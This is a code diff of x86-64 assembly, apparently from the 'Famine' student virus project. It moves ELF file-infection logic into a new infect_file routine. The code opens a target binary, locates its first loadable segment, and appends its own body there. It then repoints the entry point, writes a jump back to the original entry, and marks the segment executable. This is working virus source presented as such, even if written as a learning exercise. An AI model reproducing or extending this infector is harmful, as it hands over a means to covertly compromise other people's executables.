@@ -76,74 +76,14 @@ main:
     sub rsp, famine_size
     push rdx
     push rcx
-    push rax
-    push r8
-    push r9
-    push r10
     push rdi
     push rsi
 
 ;    mov rdi, [rsi+8]
     lea rdi, [rel ptest]
-    mov rsi, O_RDWR
-    mov rax, SYS_OPEN
-    syscall              ; open(filemane, O_RDWR)
-    cmp rax, 0           ; if (fd < 0) return ;
-    js exit
-    mov [rsp + fd], rax
-    mov rdi, rsp
-    call get_file_data
+    mov rsi, rsp
+    call infect_file
 
-get_first_pload:
-    mov r9, [rsp + fileData]
-    xor r8, r8                  ; mise a 0
-    xor rdi, rdi
-    mov di, [r9 + e_phnum]
-    mov rsi, [r9 + e_phoff]
-    xor rdx, rdx
-    mov dx, [r9 + e_phentsize]
-    xor rax, rax
-phead_loop:
-    mov eax, [r9 + rsi + p_type]
-    cmp rax, PT_LOAD
-    jz first_pload_found
-    inc r8
-    add rsi, rdx
-    cmp r8, rdi
-    jl phead_loop
-    jmp exit                    ;on quite si il y a pas de pload trouvé
-first_pload_found:
-    add r9, rsi
-    mov [rsp + pload], r9
-    mov rdi, [r9 + p_vaddr]
-    add rdi, [r9 + p_memsz]
-    mov [rsp + entry], rdi
-    mov rsi, [rsp + fileData]
-    mov [rsi + e_entry], rdi
-copy_program:
-    mov rdi, [rsp + fileData]
-    add rdi, [r9 + p_filesz]
-    lea rsi, [rel main]
-    mov rdx, PROG_SIZE
-    call ft_memcpy
-    mov rdx, [rsp + entry]
-    add rdx, JMP_OFFSET + 5
-    mov rcx, [rsp + oldEntry]
-    sub ecx, edx
-    mov [rdi + JMP_OFFSET], byte 0xE9
-    mov [rdi + JMP_OFFSET + 1], ecx
-    add qword [r9 + p_memsz], PROG_SIZE
-    add qword [r9 + p_filesz], PROG_SIZE
-    or dword [r9 + p_flags], PF_X           ; ajoute les droit d'execution
-    
-close_all:
-    mov rdi, [rsp + fileData]
-    mov rsi, [rsp + fileSize]
-    mov rax, SYS_MUNMAP 
-    syscall             ; munmap(fileData, fileSize)
-    mov rdi, [rsp + fd]
-    mov rax, SYS_CLOSE  
-    syscall             ; close(fd)
 exit:
     mov rdi, 1
     lea rsi, [rel signature]
@@ -152,23 +92,29 @@ exit:
     syscall
     pop rsi
     pop rdi
-    pop r10
-    pop r9
-    pop r8
-    pop rax
     pop rcx
     pop rdx
     add rsp, famine_size
+    leave
     
 jump:
-    leave
     ret
     nop
     nop
     nop
+    nop
 
+
+; void  infect_file(char *filename, t_famine, *famine);
+infect_file:
+    mov r12, rsi
+    mov rsi, O_RDWR
+    mov rax, SYS_OPEN
+    syscall              ; open(filemane, O_RDWR)
+    cmp rax, 0           ; if (fd < 0) return ;
+    js exit
+    mov [r12 + fd], rax
 get_file_data:
-    mov r12, rdi
     mov rdi, [r12 + fd]
     mov rsi, 0
     mov rdx, SEEK_END
@@ -190,6 +136,57 @@ get_file_data:
     mov [r12 + fileData], rax   ; faire des check pour le format
     mov rdi, [rax + e_entry]
     mov [r12 + oldEntry], rdi
+
+get_first_pload:
+    mov r13, [r12 + fileData]     ; r13 = famine->filedata;
+    xor r14, r14                  ; mise a 0
+    xor rdi, rdi
+    mov di, [r13 + e_phnum]
+    mov rsi, [r13 + e_phoff]
+    xor rdx, rdx
+    mov dx, [r13 + e_phentsize]
+    xor rax, rax
+phead_loop:
+    mov eax, [r13 + rsi + p_type]
+    cmp rax, PT_LOAD
+    jz first_pload_found
+    inc r14
+    add rsi, rdx
+    cmp r14, rdi
+    jl phead_loop
+    jmp exit                    ;on quite si il y a pas de pload trouvé
+first_pload_found:
+    add r13, rsi
+    mov [r12 + pload], r13
+    mov rdi, [r13 + p_vaddr]
+    add rdi, [r13 + p_memsz]
+    mov [r12 + entry], rdi
+    mov rsi, [r12 + fileData]
+    mov [rsi + e_entry], rdi
+copy_program:
+    mov rdi, [r12 + fileData]
+    add rdi, [r13 + p_filesz]
+    lea rsi, [rel main]
+    mov rdx, PROG_SIZE
+    call ft_memcpy
+    mov rdx, [r12 + entry]
+    add rdx, JMP_OFFSET + 5
+    mov rcx, [r12 + oldEntry]
+    sub ecx, edx
+    mov [rdi + JMP_OFFSET], byte 0xE9
+    mov [rdi + JMP_OFFSET + 1], ecx
+    add qword [r13 + p_memsz], PROG_SIZE
+    add qword [r13 + p_filesz], PROG_SIZE
+    or dword [r13 + p_flags], PF_X           ; ajoute les droit d'execution
+    
+close_all:
+    mov rdi, [r12 + fileData]
+    mov rsi, [r12 + fileSize]
+    mov rax, SYS_MUNMAP 
+    syscall             ; munmap(fileData, fileSize)
+    mov rdi, [r12 + fd]
+    mov rax, SYS_CLOSE  
+    syscall             ; close(fd)
     ret
 
 ;  void *ft_memcpy(void *dest, void* src, size_t size)
